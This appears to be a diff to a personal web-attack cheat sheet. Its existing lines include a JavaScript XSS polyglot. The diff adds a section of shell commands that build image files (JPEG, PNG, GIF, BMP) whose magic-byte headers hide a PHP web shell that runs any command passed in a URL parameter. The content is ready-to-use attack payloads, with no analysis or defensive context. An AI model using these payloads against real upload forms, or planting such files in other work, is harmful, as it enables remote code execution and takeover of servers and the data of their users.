@@ -26,3 +26,14 @@ html injection(Can use match and replace in request body):
 -------------
 JS polyglots
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+
+------
+RCE payload to creating image:
+echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > shell.jpg
+
+echo -n -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]);?>.' > shell.png
+
+echo -n -e '\x47\x49\x46\x38<?php system($_GET["cmd"]);?>.' > shell.gif
+
+echo -n -e '\x42\x4D<?php system($_GET["cmd"]);?>.' > shell.bmp
